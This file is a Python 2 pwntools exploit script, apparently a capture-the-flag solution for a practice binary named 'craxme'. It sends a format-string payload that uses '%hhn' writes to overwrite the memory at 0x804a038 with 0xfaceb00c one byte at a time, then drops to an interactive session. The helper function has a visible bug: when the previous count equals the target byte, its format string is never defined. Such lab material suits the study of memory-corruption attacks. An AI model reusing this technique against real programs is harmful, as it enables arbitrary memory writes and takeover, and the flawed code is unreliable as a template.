#! /usr/bin/python
# -*- coding: utf-8 -*-
# vim:fenc=utf-8
#
# Copyright © 2018 howpwn <finn79426@gmail.com>
#
# Distributed under terms of the MIT license.

from pwn import *

p = process("./craxme")
p.recvuntil("Give me magic :")

magic = 0x804a038
targat = 0xfaceb00c

def fmt(prev, word, index):
    if prev < word:
        result = word - prev
        fmtstr = "%" + str(result) + "c"
    elif prev == word:
        result = 0
    else:
        result = 256 - prev + word
        fmtstr = "%" + str(result) + "c"
    fmtstr += "%" + str(index) + "$hhn"
    print fmtstr
    return fmtstr

payload = flat([magic, magic+1, magic+2, magic+3])
prev = 4*4
for i in range(4): # range 等於欲填入 byte 次數
    payload += fmt(prev, (targat >> 8*i) & 0xff, 7+i) # 7 代表一開始寫入到 7$
    prev = (targat >> 8*i) & 0xff

p.sendline(payload)
p.interactive()

    


